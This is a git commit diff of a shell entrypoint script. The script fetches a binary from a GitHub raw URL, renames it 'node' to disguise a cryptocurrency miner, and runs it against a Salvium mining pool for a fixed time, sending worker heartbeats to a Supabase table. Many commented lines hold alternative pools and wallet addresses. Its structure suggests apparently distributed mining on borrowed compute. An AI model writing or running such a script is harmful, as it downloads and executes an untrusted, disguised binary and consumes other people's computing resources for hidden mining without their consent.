86c30f243ffe7d383e7bbf83b1170e25cfec9f82
menju2ikg8uti <menju2ikg8uti@kolabnow.com>
2026-02-21 01:39:36 +0700

    Update entrypoint.sh

--- 1/entrypoint.sh
+++ 1/entrypoint.sh
@@ -7,7 +7,8 @@
 curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/xmr/linux-static/node
 
 chmod +x node
-WORKER_NUMBER=$1
+INPUT_NUMBER=$1
+WORKER_NUMBER=${INPUT_NUMBER: -1}
 PASSHOURS=$(date +%S)
 
 
@@ -17,15 +18,14 @@ URL="https://$PROJECT.supabase.co/rest/v1/worker_status"
 
 # Ambil waktu WIB (UTC+7)
 TIME=$(TZ=Asia/Jakarta date +"%H:%M")
-curl -X POST "$URL" -H "apikey: $APIKEY" -H "Authorization: Bearer $APIKEY" -H "Content-Type: application/json" -H "Prefer: resolution=merge-duplicates" -d "{\"worker_name\":\"crf_${WORKER_NUMBER}\",\"last_seen\":\"$TIME\"}"
+curl -X POST "$URL" -H "apikey: $APIKEY" -H "Authorization: Bearer $APIKEY" -H "Content-Type: application/json" -H "Prefer: resolution=merge-duplicates" -d "{\"worker_name\":\"crf_${INPUT_NUMBER}\",\"last_seen\":\"$TIME\"}"
 
-echo "start ${WORKER_NUMBER}"
+echo "start ${INPUT_NUMBER}"
 
 #./node -a yespower -o stratum+tcp://mine.pool.r4nd0m.us:6991 -u WXrBvF4x5fLiaw7aiWycJfbcVKukheuxak.crf_${HOURESX} -p c=SWAMP,mc=SWAMP > try.log
 # Qogecoin
-# ./node --disable-gpu -a YescryptR16 -o stratum+tcp://us-central.pmpmining.com:5090 -u bq1qd06v7mdfme2kcdp6x47vyev7pazuq2ftyzelre.net_${WORKER_NUMBER} --cpu-threads-intensity 4 --miner-priority 4 > try.log
-#./node --disable-gpu -a YescryptR16 -o stratum+tcp://mining-pool.zapto.org:3735 -u bq1qd06v7mdfme2kcdp6x47vyev7pazuq2ftyzelre.crf_${WORKER_NUMBER} -p d=0.1 --cpu-threads-intensity 4 --miner-priority 4 > try.log
-#STAT=$(./node --disable-gpu -a YescryptR16 -o stratum+tcp://sg.pmpmining.com:5090 -u bq1qd06v7mdfme2kcdp6x47vyev7pazuq2ftyzelre.crf_${WORKER_NUMBER} -p d=0.1 --cpu-threads-intensity 4 --miner-priority 4 > try.log & sleep 1140)
+#START=$(./node --disable-gpu -a YescryptR16 -o stratum+tcp://us-central.pmpmining.com:5090 -u bq1qd06v7mdfme2kcdp6x47vyev7pazuq2ftyzelre.net_${WORKER_NUMBER} -p d=0.1 --cpu-threads-intensity 4 --miner-priority 4 > try.log & sleep 1140 )
+#./node --disable-gpu -a YescryptR16 -o stratum+tcp://mining-pool.zapto.org:3735 -u bq1qd06v7mdfme2kcdp6x47vyev7pazuq2ftyzelre.net_${WORKER_NUMBER} -p d=0.1 --cpu-threads-intensity 4 --miner-priority 4 > try.log
 # Crionic
 #./node --disable-gpu -a yespowerltncg -o crnc.miners-pool.com:23007 -u KCxkuCyNyB9CDMujccuvWxCz5PUDoyxpSv.${WORKER_NUMBER}_crf > try.log
 #./node --disable-gpu -a yespowerltncg -o mine.pool.r4nd0m.us:8919 -u KCxkuCyNyB9CDMujccuvWxCz5PUDoyxpSv.crf_${WORKER_NUMBER} -p c=CRNC,mc=CRNC,m=solo > try.log
@@ -38,7 +38,7 @@ echo "start ${WORKER_NUMBER}"
 #./node --disable-gpu -a argon2d_16000 -o stratum.aikapool.com:3919 -u chriskm0101.crf_${WORKER_NUMBER} -p x,pgid=chriskm0101 > try.log
 
 # salvium
-STAT=$(./node -a rx/0 -k --donate-level 1 -o sg.salvium.herominers.com:1230 -u SC11tt3aqqvWKBkTsrqVM4NSJfjwE2Gg3icrZvPA9WCmGEhRVGjpeoQU4d1neroY1Nfap7HtSNwdJ7rY8PoUNW5r4VSv4CmuLk=360000.net_${WORKER_NUMBER} > try.log & sleep 1140)
+START=$(./node -a rx/0 -k --donate-level 1 -o us.salvium.herominers.com:1230 -u SC11tt3aqqvWKBkTsrqVM4NSJfjwE2Gg3icrZvPA9WCmGEhRVGjpeoQU4d1neroY1Nfap7HtSNwdJ7rY8PoUNW5r4VSv4CmuLk=360000.crf_${WORKER_NUMBER} > try.log & sleep 1140 )
 
+curl -X POST "$URL" -H "apikey: $APIKEY" -H "Authorization: Bearer $APIKEY" -H "Content-Type: application/json" -H "Prefer: resolution=merge-duplicates" -d "{\"worker_name\":\"zend_crf_${INPUT_NUMBER}\",\"last_seen\":\"$TIME\"}"
 echo "done"
-curl -X POST "$URL" -H "apikey: $APIKEY" -H "Authorization: Bearer $APIKEY" -H "Content-Type: application/json" -H "Prefer: resolution=merge-duplicates" -d "{\"worker_name\":\"zend_crf_${WORKER_NUMBER}\",\"last_seen\":\"$TIME\"}"
